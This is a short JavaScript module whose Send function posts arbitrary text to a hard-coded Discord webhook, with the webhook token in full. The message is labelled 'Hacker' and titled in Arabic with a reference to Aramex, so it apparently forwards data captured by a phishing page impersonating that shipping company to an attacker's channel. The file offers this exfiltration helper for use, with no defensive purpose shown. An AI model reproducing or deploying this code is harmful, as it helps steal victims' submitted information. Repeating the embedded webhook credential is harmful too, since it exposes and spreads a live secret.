import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1330553977993035836/55XpHIbBcEszegouVvvmee-kzAn62iN-qIwo6-gEHUWmultbMRGZYz7tAZddbDCi3bAP",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
